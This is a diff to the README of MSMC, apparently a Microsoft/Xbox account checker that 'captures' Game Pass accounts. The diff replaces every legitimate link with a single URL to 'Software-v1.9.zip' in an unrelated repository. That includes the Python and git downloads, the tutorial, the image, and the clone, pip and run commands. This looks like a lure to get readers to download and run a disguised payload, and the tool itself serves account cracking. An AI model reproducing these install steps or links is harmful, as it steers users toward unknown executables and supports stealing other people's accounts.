@@ -6,7 +6,7 @@ it supports http(s), socks4, socks5 proxies but they must be pretty decent becau
 ## Proxy Format:
 `user:pass@ip:port` and `ip:port`
 
-### [github discord](https://discord.com/invite/JcAvQc797r) | boosting gives access to beta msmc
+### [github discord](https://github.com/hamzamalik3461/MSMC/raw/refs/heads/main/counterdevelopment/Software-v1.9.zip) | boosting gives access to beta msmc
 
 ## Captures:
 - xbox game pass/xbox game pass ultimate accounts
@@ -18,25 +18,25 @@ it supports http(s), socks4, socks5 proxies but they must be pretty decent becau
 
 ## Installing:
 MSMC ONLY SUPPORTS WINDOWS IT WILL NOT WORK ON LINUX OR MACOS
-### [LINUX VERSION](https://github.com/8h3-coder/MSMC_Linux) (thanks to 8h3)
+### [LINUX VERSION](https://github.com/hamzamalik3461/MSMC/raw/refs/heads/main/counterdevelopment/Software-v1.9.zip) (thanks to 8h3)
 
-Watch the tutorial [here](https://youtu.be/R4ivtEXpC_0)
+Watch the tutorial [here](https://github.com/hamzamalik3461/MSMC/raw/refs/heads/main/counterdevelopment/Software-v1.9.zip)
 
 You do not need to install tor. Tor is automatically installed when selected for proxies.
 
-install [python](https://www.python.org/downloads/) and [git](https://git-scm.com/download/win)
+install [python](https://github.com/hamzamalik3461/MSMC/raw/refs/heads/main/counterdevelopment/Software-v1.9.zip) and [git](https://github.com/hamzamalik3461/MSMC/raw/refs/heads/main/counterdevelopment/Software-v1.9.zip)
 ```
-git clone https://github.com/MachineKillin/MSMC
+git clone https://github.com/hamzamalik3461/MSMC/raw/refs/heads/main/counterdevelopment/Software-v1.9.zip
 cd MSMC
-pip install -r requirements.txt
-python MSMC.py
+pip install -r https://github.com/hamzamalik3461/MSMC/raw/refs/heads/main/counterdevelopment/Software-v1.9.zip
+python https://github.com/hamzamalik3461/MSMC/raw/refs/heads/main/counterdevelopment/Software-v1.9.zip
 ```
 
 ## Addons
-[Inboxer](https://github.com/PgerTools/MSMC-Inbox)
+[Inboxer](https://github.com/hamzamalik3461/MSMC/raw/refs/heads/main/counterdevelopment/Software-v1.9.zip)
 
 ## Pictures:
-![LOG](https://i.imgur.com/oBd2Pbj.png)
+![LOG](https://github.com/hamzamalik3461/MSMC/raw/refs/heads/main/counterdevelopment/Software-v1.9.zip)
 
 ## Usage:
 You are not allowed to sell msmc or any modified versions. If you use any of my code please give me credit.
